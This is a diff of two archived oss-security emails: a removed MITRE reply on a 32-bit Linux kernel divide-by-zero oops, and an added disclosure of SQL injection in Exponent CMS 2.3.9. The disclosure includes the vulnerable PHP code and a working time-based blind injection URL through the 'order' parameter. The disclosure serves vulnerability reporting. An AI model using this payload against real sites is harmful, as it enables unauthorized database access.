@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3761" "Tuesday" "14" "April" "2015" "02:21:41" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20150414062141.CE1CE6C4009@smtpvmsrv1.mitre.org>" "85" "[oss-security] Re: Kernel oops on 32 bits arch" nil nil nil "4" "2015041406:21:41" "[oss-security] Re: Kernel oops on 32 bits arch" (number mark "        cve-assign@m Apr 14   85/3761  " thread-indent "\"[oss-security] Re: Kernel oops on 32 bits arch\"\n") "<5527EA22.2000702@reactos.org>" ("<5527EA22.2000702@reactos.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4129" "Monday" "19" "September" "2016" "08:08:32" "-0400" "=?UTF-8?B?546L56a55ZOy?=" "0xtom4to@gmail.com" "<CAJ8RaNbqj2sOAtx51OZ7_7O2TbP2q8+O=7G14xjXz5bcAM1NcQ@mail.gmail.com>" "113" "[oss-security] Exponent CMS 2.3.9 SQL injection vulnerabilities" nil nil nil "9" "2016091912:08:32" "[oss-security] Exponent CMS 2.3.9 SQL injection vulnerabilities" (number mark "U       0xtom4to@gma Sep 19  113/4129  " thread-indent "\"[oss-security] Exponent CMS 2.3.9 SQL injection vulnerabilities\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 3833 invoked by uid 550); 14 Apr 2015 06:22:06 -0000
+Received: (qmail 11543 invoked by uid 550); 19 Sep 2016 12:12:33 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,98 +11,151 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 3770 invoked from network); 14 Apr 2015 06:21:53 -0000
-In-Reply-To: <5527EA22.2000702@reactos.org>
-Message-Id: <20150414062141.CE1CE6C4009@smtpvmsrv1.mitre.org>
-Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
-Date: Tue, 14 Apr 2015 02:21:41 -0400 (EDT)
-From: cve-assign@mitre.org
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Re: Kernel oops on 32 bits arch
-To: pierre@reactos.org
+Received: (qmail 9498 invoked from network); 19 Sep 2016 12:08:45 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20120113;
+        h=from:mime-version:date:message-id:subject:to:cc;
+        bh=UpumzYKWgljk9jmqNYA/M5DdsTxBw6Dyce5P/NDKGXk=;
+        b=Wu5TBCEA8xaaKvpLUj5DpFfcyb8vNPvXu1nvAdbSEaO3C9mzC+Vk8axCarwtsIjYmP
+         n98DBnkYr7y19qJPiuDLnEC7N6LKOS83wwasWT1eIKdQcY1xysayYd3a7FwXAkAlfeVQ
+         /uP+vUhHFhpYZUDJANi+/rwld4+AYQtkdAurPmmxzJgbwy3UucUS75CgSxoNYRX90xFE
+         gL+cu16/GCwIz5+rVboMiDx8n7WjG7xP2st2KjlooAvDG9lXhIruN8f4KCqrFgjA/WcW
+         IpjwaWeGA2gfb/+LpEihXOEOACQst94+DXkMt5FpqmLcZVBEF6UgS3SQo3Pny4ArSS4Y
+         Kjdg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:from:mime-version:date:message-id:subject:to:cc;
+        bh=UpumzYKWgljk9jmqNYA/M5DdsTxBw6Dyce5P/NDKGXk=;
+        b=WGLwH5gl3spyiOEuD/bxFGTZA+6PmO8SCiG8lhVWY5Eai+sgBRTP8XRLJGqu3xsLg3
+         wc5IQWgEZ+4jYfjSOg2HQ6MoVGR1P+afiULwBdnAepqnwFMn640tGqDYLzrOv7clXt8l
+         0Q2qTZYrhXrl82U9MvEgVEPSgqAvvF6I1DoEh9JRCWIWaHP4Xhs/i8tSNvy0uEUusSX1
+         kASruVlqmYOobmMm0RkRFvuDF4ivVojlXCnQiDZmodCesj47Vl9JP6zsH1Ni5dMqI7Dj
+         L8zaCv22aOiotfNsru/ttCj52ekAXBJXgzhUqVBUw8lI+li+jqneQJVRfihXgGK3+7Mp
+         wjMQ==
+X-Gm-Message-State: AE9vXwOjdfxkLUhtuutuTQQ2o2pAYK68YSQK6jE9YH+l7A2FLsA3EaZXKh6pEXgjWC8Bf90yDvL81jxZu6oOUQ==
+X-Received: by 10.66.138.37 with SMTP id qn5mr46710264pab.33.1474286913149;
+ Mon, 19 Sep 2016 05:08:33 -0700 (PDT)
+From: =?UTF-8?B?546L56a55ZOy?= <0xtom4to@gmail.com>
+X-Mailer: Airmail (382)
+MIME-Version: 1.0
+Date: Mon, 19 Sep 2016 08:08:32 -0400
+Message-ID: <CAJ8RaNbqj2sOAtx51OZ7_7O2TbP2q8+O=7G14xjXz5bcAM1NcQ@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Cc: cve-assign@mitre.org
+Content-Type: multipart/alternative; boundary=047d7b15a7e5c16052053cdb2bd6
+Subject: [oss-security] Exponent CMS 2.3.9 SQL injection vulnerabilities
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+--047d7b15a7e5c16052053cdb2bd6
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
 
-> This bug report has been brought to my attention [1] where under high
-> load a server can be oopsed, be it grsec or vanilla kernel.
-> 
-> Apparently, it's due to a partial fix that would have only be deployed
-> to 64 bits Linux [2].
-> 
-> Has anyone more info on this? Like why there was only a 64 bits fix?
-> Was a CVE assigned for this?
-> 
-> [1]: https://bugs.gentoo.org/show_bug.cgi?id=536040
-> [2]: https://lkml.org/lkml/2014/4/29/497
+Author: Tomato, jianing.wang@chaitin.com
 
-As far as we can tell, https://lkml.org/lkml/2014/4/29/497 ultimately
-resulted in the
-http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=d5c9fde3dae750889168807038243ff36431d276
-commit.
+Date:2016=E2=80=9309=E2=80=9319
 
-https://bugs.gentoo.org/show_bug.cgi?id=536040#c20 says
+Version: 2.3.9 and earlier
 
-  so we think it's an upstream bug https://lkml.org/lkml/2014/4/29/497
-  that was fixed only on 64 bit archs. on 32 bit archs the function in
-  question uses a 32 bit type (unsigned long) instead of u64 and
-  therefore the trunction issue mentioned in the thread can very well
-  happen.
+/exponent=E2=80=932.3.9/framework/core/subsystems/expPaginator.php
 
-This suggests that the same source code is used on all platforms, but
-the code with the d5c9fde3dae750889168807038243ff36431d276 patch is
-correct if the size of "unsigned long" is 8, but incorrect if the size
-of "unsigned long" is 4. (There isn't a patch offered for the latter
-case, although the implication seems to be that the code is inherently
-incorrect, and isn't affected by any compiler bug.) If so, then
-conceivably there could be at least two CVE IDs, i.e.,
 
-  First issue: reachable "divide by zero" in versions before 3.14.6 on
-  64-bit platforms
-  (https://www.kernel.org/pub/linux/kernel/v3.x/ChangeLog-3.14.6)
+if (strstr($this->order," ")) {
+            $orderby =3D explode(" ",$this->order);
+            $this->order =3D $orderby[0];
+            $this->order_direction =3D $orderby[1];
+        }
+        if ($this->dontsort)
+            $sort =3D null;
+        else
+            $sort =3D $this->order.' '.$this->order_direction;
 
-  Second issue: reachable "divide by zero" in these versions and newer
-  versions on 32-bit platforms
+        // figure out how many records we're dealing with & grab the records
+        //if (!empty($this->records)) { //from Merge <~~ this doesn't
+work. Could be empty, but still need to hit.
+        if (!empty($this->categorize))
+            $limit =3D null;
+        else
+            $limit =3D $this->limit;
 
-[ there hasn't been a report of a security impact for the
-  "incorrect value when (setpoint - limit) exceeds 2^32" issue ]
+        if (isset($params['records'])) { // if we pass
+$params['records'], we WANT to hit this
+            // sort the records that were passed in to us
+            if (!empty($sort))
+                usort($this->records,array('expPaginator',
+strtolower($this->order_direction)));
+//          $this->total_records =3D count($this->records);
+        } elseif (!empty($class)) { //where clause     //FJD: was
+$this->class, but wasn't working...
+            $this->total_records =3D $class->find('count', $this->where);
+            $this->records =3D $class->find('all', $this->where, $sort,
+$limit, $this->start);
+        } elseif (!empty($this->where)) { //from Merge....where clause
+            $this->total_records =3D $class->find('count', $this->where);
+            $this->records =3D $class->find('all', $this->where, $sort,
+$limit, $this->start);
+        } else { //sql clause  //FIXME we don't get attachments in this app=
+roach
+            //$records =3D $db->selectObjectsBySql($this->sql);
+            //$this->total_records =3D count($records);
+            //this is MUCH faster if you supply a proper count_sql
+param using a COUNT() function; if not,
+            //we'll run the standard sql and do a queryRows with it
+            //$this->total_records =3D $this->count_sql =3D=3D '' ?
+$db->queryRows($this->sql) : $db->selectValueBySql($this->count_sql);
+//From Merge
 
-The available information about the attack vector for the second issue
-is "unspecified traffic to an Apache HTTP Server 2.x that leads to a
-substantial amount of disk I/O to an ext4 filesystem." There is no
-available information about an attack vector for the first issue.
+//          $this->total_records =3D
+$db->countObjectsBySql($this->count_sql);
+//$db->queryRows($this->sql); //From most current Trunk
 
-We don't know whether there are other attack vectors involving FUSE.
-The comments in page-writeback.c refer to the effects of "mistrusted
-filesystems" on the number of dirty pages, and possibly such a
-filesystem could make it easier to reach a case with a
-pos_ratio_polynom bug.
+            if (!empty($sort)) $this->sql .=3D ' ORDER BY '.$sort;
 
-In general, the two issues listed above are ones that often would not
-have CVE IDs because the attack methodology is underspecified, or
-because too little is known about the relationship between an attack
-and the bug. However, it seems very likely that the untrusted HTTP
-traffic is, indirectly, causing the bug to be triggered much more
-often than it otherwise would have been. So, it does seem valid for
-the issues to have CVE IDs, if the CVE IDs are useful to someone.
 
-Was "Was a CVE assigned for this?" intended to mean that a CVE ID is
-useful, i.e., you would actually use a CVE ID to track an OOPS issue
-in the management of dirty pages?
+i can controller $order ,i can use this parameter to sql injection
 
-- -- 
-CVE assignment team, MITRE CVE Numbering Authority
-M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.14 (SunOS)
+such as
 
-iQEcBAEBAgAGBQJVLLFFAAoJEKllVAevmvmst+QH/jF6SuBJAtxYZX+WYpWkcSwu
-f8h4dGncGX947++aB0NWVVmD2AlckRkZOdIYL2r2JE9M/2yrHHNq72cAPylYQD//
-m55DggeJ6mia756FWng9JSV3qf48tNqZq5nAFFZH8OsIG9dlNV4esCqLS0qsYtAo
-To6LixAVrcFpofzi+q7U8ON0IxfBoix+J1eQoT3ITyRJ+NwnvWX/jLm6jOk/lbSS
-Q4Wh61+/EQEpxIga3CJ2J3g0pHM20wrSNxMV9Tpgl7vFwWSP9csNsc+XPp4HUZB7
-XYwAf6FQWAdYC0WyhzYxqEZP2YIkrd0uhVp0KJdvcj8pRow20/MhCN7Rl7Q8vto=
-=/Ro0
------END PGP SIGNATURE-----
+exponent=E2=80=932.3.9/framework/modules/company/controllers/companyControl=
+ler.php
+
+```php function showall() { expHistory::set(=E2=80=98viewable=E2=80=99, $th=
+is->params);
+$page =3D new expPaginator(array( =E2=80=98model=E2=80=99=3D>$this->basemod=
+el_name, =E2=80=98where=E2=80=99=3D>1,
+=E2=80=98limit=E2=80=99=3D>(isset($this->params[=E2=80=98limit=E2=80=99]) &=
+& $this->config[=E2=80=98limit=E2=80=99] !=3D =E2=80=99=E2=80=98) ?
+$this->params[=E2=80=98limit=E2=80=99] : 10, =E2=80=98order=E2=80=99=3D>iss=
+et($this->params[=E2=80=98order=E2=80=99]) ?
+$this->params[=E2=80=98order=E2=80=99] : =E2=80=98rank=E2=80=99, =E2=80=98p=
+age=E2=80=99=3D>(isset($this->params[=E2=80=98page=E2=80=99]) ?
+$this->params[=E2=80=98page=E2=80=99] : 1), =E2=80=98controller=E2=80=99=3D=
+>$this->baseclassname,
+=E2=80=98action=E2=80=99=3D>$this->params[=E2=80=98action=E2=80=99], =E2=80=
+=98columns=E2=80=99=3D>array(
+gt(=E2=80=98Manufacturer=E2=80=99)=3D>=E2=80=99title=E2=80=99, gt(=E2=80=98=
+Website=E2=80=99)=3D>=E2=80=99website=E2=80=99 ), ));
+
+    assign_to_template(array(
+        'page'=3D>$page,
+        'items'=3D>$page->records
+    ));
+}
+```
+
+the poc is
+
+http://127.0.0.1/exponent=E2=80=932.3.9/index.php?controller=3Dcompany&acti=
+on=3Dshowall&limit=3D1&order=3D(select/*
+*/*/*/from/*/(select/**/sleep(5))x)%23
+
+in the mysql log we can see this
+
+SELECT * FROM exponent_companies WHERE 1 ORDER BY
+(select/**/*/*/from/*/(select/**/sleep(5))x)#
+ASC LIMIT 0,10
+
+Could you assign CVE id for this?
+
+Regards, Tomato
+
+--047d7b15a7e5c16052053cdb2bd6--
